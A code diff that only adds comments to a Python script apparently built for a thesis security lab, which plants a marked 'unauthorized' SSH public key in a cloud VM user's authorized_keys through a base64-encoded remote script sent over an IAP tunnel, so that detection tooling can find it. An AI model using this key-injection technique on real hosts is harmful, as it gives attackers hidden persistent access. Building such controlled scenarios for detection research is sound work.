@@ -5,6 +5,7 @@ import sys
 from pathlib import Path
 
 
+# --- Project paths and connection settings ---
 PROJECT_ROOT = Path(__file__).resolve().parents[1]
 STATE_FILE = PROJECT_ROOT / "controller" / "ssh_rotation_state.json"
 
@@ -13,6 +14,8 @@ TARGET_USER = "thesisadmin"
 ZONE = "europe-west1-b"
 PROJECT_ID = "project-207ee30d-2273-45b0-8a0"
 
+# --- Controlled unauthorized SSH-key marker used by this scenario ---
+# The marker lets detection/evidence/validation find the exact injected key.
 ATTACK_MARKER = "THESIS_UNAUTHORIZED_SSH_KEY"
 UNAUTHORIZED_KEY = (
     "ssh-rsa "
@@ -24,6 +27,7 @@ UNAUTHORIZED_KEY = (
 )
 
 
+# --- Load the private key currently used to administer the target VM ---
 def get_current_private_key():
     if not STATE_FILE.exists():
         raise FileNotFoundError(
@@ -51,13 +55,17 @@ def get_current_private_key():
     return private_key
 
 
+# --- Inject the unauthorized public key and confirm it is present ---
 def main():
     private_key = get_current_private_key()
 
+    # Base64 keeps the key text intact while it is embedded in the remote shell command.
     encoded_key = base64.b64encode(
         UNAUTHORIZED_KEY.encode("utf-8")
     ).decode("ascii")
 
+    # Remote attack script appends the controlled key to authorized_keys,
+    # fixes the expected file permission, then requires the marker to be readable back.
     attack_script = rf'''set -e
 
 AUTHORIZED_KEYS="/home/{TARGET_USER}/.ssh/authorized_keys"
@@ -85,10 +93,12 @@ grep -F "$ATTACK_MARKER" "$AUTHORIZED_KEYS"
 echo UNAUTHORIZED_SSH_PUBLIC_KEY_CREATED
 '''
 
+    # Encode the whole remote script so quoting/newlines survive the SSH command.
     encoded_script = base64.b64encode(
         attack_script.encode("utf-8")
     ).decode("ascii")
 
+    # IAP tunnel is used as the transport for the administrative SSH connection.
     proxy_command = (
         "gcloud.cmd compute start-iap-tunnel "
         f"{TARGET_HOST} %p "
@@ -127,6 +137,7 @@ echo UNAUTHORIZED_SSH_PUBLIC_KEY_CREATED
     if process.stderr:
         print(process.stderr.strip())
 
+    # Do not rely only on SSH's exit code; require the explicit remote success marker too.
     if (
         process.returncode != 0
         or "UNAUTHORIZED_SSH_PUBLIC_KEY_CREATED"
